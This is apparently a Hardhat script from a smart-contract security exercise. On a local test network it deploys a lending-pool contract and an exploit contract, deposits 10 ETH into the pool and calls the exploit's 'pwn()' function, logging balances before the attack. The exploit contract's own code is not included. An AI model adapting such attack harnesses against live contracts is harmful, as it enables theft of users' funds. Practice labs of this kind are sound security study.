import { ethers } from "hardhat";
import { ethers as vanillaEthers } from "ethers";

async function main() {
    const [owner, alice, bob] = await ethers.getSigners();
    const ownerAddress = await owner.getAddress();

    const EthLendingPool = await ethers.getContractFactory("EthLendingPool");
    const EthLendingPoolExploit = await ethers.getContractFactory("EthLendingPoolExploit");

    const ethLendingPool = await EthLendingPool.deploy();
    const ethLendingPoolExploit = await EthLendingPoolExploit.deploy(ethLendingPool.address);
    const depositByBob = await ethLendingPool.deposit({ value: vanillaEthers.utils.parseEther('10') });
    const prePoolBalance = await ethLendingPool.getBalance();
    const preExploitBalance = await ethLendingPoolExploit.getBalance();
    console.log(`Before state: ethLendingPool balance: ${prePoolBalance} and EthLendingPoolExploit balance: ${preExploitBalance}`);
    const depositTxn = await ethLendingPoolExploit.pwn();
    // const postPoolBalance = await ethLendingPool.getBalance();
    // const postExploitBalance = await ethLendingPoolExploit.getBalance();
    // console.log(`After state: ethLendingPool balance: ${postPoolBalance} and EthLendingPoolExploit balance: ${postExploitBalance}`);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
